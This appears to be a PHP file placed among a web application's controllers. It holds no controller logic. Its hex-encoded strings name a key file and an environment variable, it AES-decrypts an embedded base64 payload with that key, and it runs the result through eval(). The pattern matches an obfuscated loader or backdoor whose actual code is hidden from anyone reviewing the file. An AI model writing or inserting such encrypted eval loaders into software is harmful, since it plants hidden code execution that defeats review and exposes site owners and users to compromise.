<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('+m2bb5R/STueHxz5pk6sqw==');

$c=base64_decode(

'/oFLUVJWoZk52MrMnOQDAQeRP1v0riRR1p+JM3FUonu24MamnFqvRviVzhw1eppjnh+pyTjUkp98' .
'aPRWBmtK4RJG22A+bO0oDR8eVhrqzZPTJ6MCBO2ldRuDIbHJ5qzdT1bOS+tRjo96QImogEN4n6Iy' .
'fcrDs6/xpyWzB2dVHmg1cL+T358oEo3Jw6bZj877uDQB823lNz0AgK+uG1cWMOj8CHFjofmTbneq' .
'wchv3teDGyVVQGqnvsGO3Du8cc9n'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

